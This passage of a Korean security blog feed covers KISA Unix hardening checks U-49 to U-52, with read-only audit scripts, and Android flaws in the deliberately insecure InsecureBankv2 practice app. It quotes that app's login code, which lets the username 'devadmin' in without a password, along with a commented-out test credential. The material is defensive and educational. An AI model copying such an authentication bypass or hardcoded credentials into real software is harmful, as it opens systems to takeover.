    <url>/2022/01/19/2022-01-19-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-49%20%EB%B6%88%ED%95%84%EC%9A%94%ED%95%9C%20%EA%B3%84%EC%A0%95%20%EC%A0%9C%EA%B1%B0/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>시스템 계정 중 불필요한 계정이 존재하는지에 대한 점검입니다.</p>
<p>항목코드는 <code>U-49</code>이며, 항목 주요도는 <code>하</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>불필요한 계정이 존재하는지 점검하여 관리되지 않은 계정에 의한 침입에 대비하는지 확인하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>로그인이 가능하고 현재 사용하지 않는 불필요한 계정은 사용중인 계정보다 상대적으로 관리가 취약하여 공격자의 목표가 되어 계정이 탈취될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 불필요한 계정이 존재하지 않는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 불필요한 계정이 존재하는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) 미사용 계정 및 의심스러운 게정 존재 여부 확인<br />    <code># cat /etc/passwd</code><br /><br />2) 사용하지 않는 Default 계정 점검<br />    <code># cat /etc/passwd | egrep &quot;lp|uucp|nuucp&quot;</code></td>
</tr>
<tr>
<td>LOG를 통한<br />확인</td>
<td>1) 최근 로그인하지 않은 계정 및 의심스러운 계정 확인<br />    <code># cat /var/adm/wtmp</code> (SOLARIS, AIX, HP-UX)<br />    <code># cat /var/log/wtmp</code> (LINUX)<br />    <code># cat /var/adm/authlog</code> (AIX, HP-UX)<br />    <code># cat /var/adm/authlog</code> (SOLARIS)<br />    <code># cat /var/adm/sulog</code> (SOLARIS, AIX, HP-UX)<br />    <code># cat /var/adm/sulog</code> (LINUX)</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/passwd | egrep &quot;lp|uucp|nuucp&quot;</p>
</blockquote>
<br>

<p>사용하지 않는 default 계정을 점검하였습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-49/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX</td>
<td>1) 서버에 등록된 불필요한 사용자 계정 확인<br /><br />2) <code>userdel</code> 명령으로 불필요한 사용자 계정 삭제<br />    <code># userdel &lt;user_name&gt;</code></td>
</tr>
<tr>
<td>AIX</td>
<td>1) 서버에 등록된 불필요한 사용자 계정 확인<br /><br />2) <code>rmuser</code> 명령으로 불필요한 사용자 계정 삭제<br />    <code># rmuser &lt;user_name&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/passwd | egrep <span class="string">&quot;lp|uucp|nuucp&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=O</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=X</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-49 [불필요한 계정 제거]<span class="string">&quot;\n&quot;</span>Default 계정 존재 여부 : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-49.txt</span><br></pre></td></tr></table></figure>

<br>

<p>사용하지 않는 Default 계정을 찾아줍니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-49</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-49/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-50 관리자 그룹에 최소한의 계정 포함</title>
    <url>/2022/01/19/2022-01-19-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-50%20%EA%B4%80%EB%A6%AC%EC%9E%90%20%EA%B7%B8%EB%A3%B9%EC%97%90%20%EC%B5%9C%EC%86%8C%ED%95%9C%EC%9D%98%20%EA%B3%84%EC%A0%95%20%ED%8F%AC%ED%95%A8/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>시스템 관리자 그룹에 최소한의 계정만 존재하는지에 대한 점검입니다.</p>
<p>항목코드는 <code>U-50</code>이며, 항목 주요도는 <code>하</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>관리자 그룹에 최소한의 계정만 조재하는지 점검하여 불필요하게 권한이 남용되고 있는지 확인하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>시스템을 관리하는 root 계정이 속한 그룹은 시스템 운영 파일에 대한 접근 권한이 부여되어 있으므로 해당 관리자 그룹에 속한 계정이 비인가자에게 유출될 경우 관리자 권한으로 시스템에 접근하여 계정 정보 유출, 환경설정 파일 및 디렉터리 변조 등의 위험이 존재합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 관리자 그룹에 불필요한 계정이 등록되어 있지 않은 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 관리자 그룹에 불필요한 계정이 등록되어 있는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX</td>
<td><code># cat /etc/group</code><br />    <code>root:x:0:root</code></td>
</tr>
<tr>
<td>AIX</td>
<td><code># cat /etc/group</code><br />    <code>system:!:0:root</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/group | grep :0:</p>
</blockquote>
<br>

<p>관리자 그룹에 포함된 계정이 등록되어있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-50/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/group</code> 파일 열기<br /><br />2) root 그룹에 등록된 불필요한 계정 삭제<br />    (수정 전) <code>root:x:0:root,test</code><br />    (수정 후) <code>root:x:0:root</code></td>
</tr>
<tr>
<td>AIX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/group</code> 파일 열기<br /><br />2) system 그룹에 등록된 불필요한 계정 삭제<br />    (수정 전) <code>system:!:0:root,test</code><br />    (수정 후) <code>system:!:0:root</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/group | grep :0:`</span><br><span class="line">ProcessResult=<span class="variable">$&#123;process:9&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-50 [관리자 그룹에 최소한의 계정 포함]<span class="string">&quot;\n&quot;</span>관리자 그룹에 포함된 계정 : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-50.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/group</code> 파일에서 관리자 그룹에 포함된 계정들을 출력해줍니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-50</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-50/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-51 계정이 존재하지 않는 GID 금지</title>
    <url>/2022/01/20/2022-01-20-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-51%20%EA%B3%84%EC%A0%95%EC%9D%B4%20%EC%A1%B4%EC%9E%AC%ED%95%98%EC%A7%80%20%EC%95%8A%EB%8A%94%20GID%20%EA%B8%88%EC%A7%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>그룹 설정 파일에 불필요한 그룹이 존재하는지에 대한 점검입니다.</p>
<p>항목코드는 <code>U-51</code>이며, 항목 주요도는 <code>하</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>시스템에 불필요한 그룹이 존재하는지 점검하여 불필요한 그룹의 소유권으로 설정되어 있는 파일의 노출에 의해 발생할 수 있는 위험에 대한 대비가 되어 있는지 확인하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>계정이 존재하지 않는 그룹은 현재 사용되고 있는 그룹의 아닌 불필요한 그룹으로 삭제 조치가 필요합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 시스템 관리나 운용에 불필요한 그룹이 삭제 되어있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 시스템 관리나 운용에 불필요한 그룹이 존재한 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX,<br />AIX</td>
<td><code># cat /etc/group</code><br /><code># cat /etc/passwd</code></td>
</tr>
<tr>
<td>LINUX</td>
<td><code># cat /etc/gshadow</code><br /><br />* gshadow 파일 : <code>shadow</code> 파일에 사용자 계정의 암호가<br />저장되어 있는 것처럼 시스템 내 존재하는 그룹의 암호 정보 저장<br />파일로 그룹 관리자 및 구성원 설정 가능</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/group</p>
</blockquote>
<br>

<p><code>/etc/group</code> 파일에서 현재 존재하고 있는 그룹을 출력해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-51/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX,<br />AIX</td>
<td><code># groupdel &lt;group_name&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">process=`cut -f 1 -d <span class="string">&#x27;:&#x27;</span> /etc/group | tr <span class="string">&quot;\n&quot;</span> <span class="string">&quot;\t&quot;</span> | sed <span class="string">&#x27;s/.\&#123;1\&#125;$//&#x27;</span>`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-51 [계정이 존재하지 않는 GID 금지]<span class="string">&quot;\n&quot;</span>현재 존재하고 있는 그룹 : <span class="string">&quot;\n&quot;</span><span class="string">&quot;<span class="variable">$process</span>&quot;</span> | tee /root/result/u-51.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/group</code> 파일에서 현재 존재하는 그룹들을 출력해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-51</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-51/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 하드코딩 보안</title>
    <url>/2022/01/20/2022-01-20-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%ED%95%98%EB%93%9C%EC%BD%94%EB%94%A9%20%EB%B3%B4%EC%95%88/</url>
    <content><![CDATA[<h1 id="🤔-하드코딩-보안"><a href="#🤔-하드코딩-보안" class="headerlink" title="🤔  하드코딩 보안?"></a>🤔  하드코딩 보안?</h1><br>

<p>코드 안에 어떠한 의미를 갖는 변수를 상수로 사용하거나 코드를 다시 컴파일하지 않고서는 바꿀 수 없는 형태로 코딩으로 인해 발생하는 취약점입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<p>민감한 정보를 하드코딩을 할 경우 디컴파일이나 리버싱을 통해 충분히 확인할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<h2 id="중요-정보-검색"><a href="#중요-정보-검색" class="headerlink" title="중요 정보 검색"></a>중요 정보 검색</h2><br>

<p>사용자 아이디를 검색해봤을 때 주석에 아이디와 비밀번호가 노출되었습니다.</p>
<br>

<img src="/images/Android/하드코딩 보안/find.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p>프로그램을 개발 중 개발자용 테스트 계정을 주석으로 처리하는 것은 위험한 습관입니다. 개발 완료 후 일일이 주석을 제거하는 것은 매우 어렵기 때문입니다.</p>
<p>암호화키 같은 경우 상수로 명시하면 안되고 솔트를 사용하여 암호화의 안전성을 높이는 것이 중요합니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 사용자 정보 목록화 이슈</title>
    <url>/2022/01/20/2022-01-20-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EC%82%AC%EC%9A%A9%EC%9E%90%20%EC%A0%95%EB%B3%B4%20%EB%AA%A9%EB%A1%9D%ED%99%94%20%EC%9D%B4%EC%8A%88/</url>
    <content><![CDATA[<h1 id="🤔-사용자-정보-목록화-이슈"><a href="#🤔-사용자-정보-목록화-이슈" class="headerlink" title="🤔  사용자 정보 목록화 이슈?"></a>🤔  사용자 정보 목록화 이슈?</h1><br>

<p>시스템 인증 체계에 취약점이 존재하여 공격자가 시스템에 존재하는 사용자들의 계정 목록을 획득할 수 있는 취약점입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<p>로그인 시도 시 반환된 메시지를 통하여 사용자 계정에 대한 정보를 수집할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<h2 id="로그인-시도-패킷-캡처"><a href="#로그인-시도-패킷-캡처" class="headerlink" title="로그인 시도 패킷 캡처"></a>로그인 시도 패킷 캡처</h2><br>

<p><code>없는 아이디</code> <code>비밀번호가 틀린 아이디</code> <code>성공적으로 로그인 된 아이디</code> 로 로그인을 시도해보았습니다.</p>
<br>

<img src="/images/Android/사용자 정보 목록화 이슈/nouser.png">

<br>

<p><code>User Does not Exist</code> 사용자 계정이 없다고 반환 메시지를 출력하고 있습니다.</p>
<br>

<br>

<img src="/images/Android/사용자 정보 목록화 이슈/fail.png">

<br>

<p><code>Wrong Password</code> 비밀번호가 틀렸다고 반환 메시지를 출력하고 있습니다.</p>
<br>

<br>

<img src="/images/Android/사용자 정보 목록화 이슈/success.png">

<br>

<p><code>Correct Credentials</code> 로그인에 성공했다고 반환 메시지를 출력하고 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p>로그인 시도 시 에러 메시지를 통해 정보를 유추할 수 없도록 메시지를 반환해야 합니다.</p>
<p>에러 메시지를 통해 정보를 유추할 수 있는 경우 무차별 대입 공격과 같은 반복적인 공격에 취약해집니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 개발자 백도어</title>
    <url>/2022/01/20/2022-01-20-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EA%B0%9C%EB%B0%9C%EC%9E%90%20%EB%B0%B1%EB%8F%84%EC%96%B4/</url>
    <content><![CDATA[<h1 id="🤔-개발자-백도어"><a href="#🤔-개발자-백도어" class="headerlink" title="🤔  개발자 백도어?"></a>🤔  개발자 백도어?</h1><br>

<p>개발자가 인증 과정을 거치지 않고 접속할 수 있는 통로를 만들어서 생기는 취약점입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<p>개발자들이 유지보수나 디버깅 시 인증 시간 등을 단축하기 위한 요소로 백도어를 만듭니다.</p>
<p>해당 백도어가 공격자에게 발견되면 시스템에 큰 위험을 초래할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<h2 id="DoLogin-java"><a href="#DoLogin-java" class="headerlink" title="DoLogin.java"></a>DoLogin.java</h2><br>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* DoLogin.java 일부 */</span>	</span><br><span class="line"></span><br><span class="line">			HttpClient httpclient = <span class="keyword">new</span> DefaultHttpClient();</span><br><span class="line">			HttpPost httppost = <span class="keyword">new</span> HttpPost(protocol + serverip + <span class="string">&quot;:&quot;</span> + serverport + <span class="string">&quot;/login&quot;</span>);</span><br><span class="line">			HttpPost httppost2 = <span class="keyword">new</span> HttpPost(protocol + serverip + <span class="string">&quot;:&quot;</span> + serverport + <span class="string">&quot;/devlogin&quot;</span>);</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Add your data</span></span><br><span class="line">			List &lt; NameValuePair &gt; nameValuePairs = <span class="keyword">new</span> ArrayList &lt; NameValuePair &gt; (<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">			<span class="comment">//                Delete below test accounts in production</span></span><br><span class="line">			<span class="comment">//                nameValuePairs.add(new BasicNameValuePair(&quot;username&quot;, &quot;jack&quot;));</span></span><br><span class="line">			<span class="comment">//                nameValuePairs.add(new BasicNameValuePair(&quot;password&quot;, &quot;jack@123$&quot;));</span></span><br><span class="line"></span><br><span class="line">			nameValuePairs.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">&quot;username&quot;</span>, username));</span><br><span class="line">			nameValuePairs.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">&quot;password&quot;</span>, password));</span><br><span class="line">			HttpResponse responseBody;</span><br><span class="line">			<span class="keyword">if</span> (username.equals(<span class="string">&quot;devadmin&quot;</span>)) &#123;</span><br><span class="line">				httppost2.setEntity(<span class="keyword">new</span> UrlEncodedFormEntity(nameValuePairs));</span><br><span class="line">				<span class="comment">// Execute HTTP Post Request</span></span><br><span class="line">				responseBody = httpclient.execute(httppost2);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				httppost.setEntity(<span class="keyword">new</span> UrlEncodedFormEntity(nameValuePairs));</span><br><span class="line">				<span class="comment">// Execute HTTP Post Request</span></span><br><span class="line">				responseBody = httpclient.execute(httppost);</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<br>

<p>해당 코드를 보면 username이 <code>devadmin</code> 이면 암호 인증 없이 로그인이 가능하도록 만들어두었습니다.</p>
<br>

<br>

<img src="/images/Android/개발자 백도어/devadmin.png">

<br>

<p><code>devadmin</code> 계정으로 암호 인증 없이 로그인이 됐습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p>앱을 배포하기 전 테스트 용도로 만든 계정을 삭제하거나 인증을 우회하는 코드를 삭제하고 앱을 배포해야 합니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-52 동일한 UID 금지</title>
    <url>/2022/01/20/2022-01-20-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-52%20%EB%8F%99%EC%9D%BC%ED%95%9C%20UID%20%EA%B8%88%EC%A7%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>/etc/passwd</code> 파일 내 <code>UID</code>가 동일한 사용자 계정 존재 여부에 대한 점검입니다.</p>
<p>항목코드는 <code>U-52</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p><code>UID</code>가 동일한 사용자 계정을 점검함으로써 타 사용자 계정 소유의 파일 및 디렉터리로의 악의적 접근 예방 및 침해사고 시 명확한 감사추적을 위한 목적입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>중복된 <code>UID</code>가 존재할 경우 시스템은 동일한 사용자로 인식하여 소유자의 권한이 중복되어 불필요한 권한이 부여되며 시스템 로그를 이용한 감사 추적 시 사용자가 구분되지 않습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

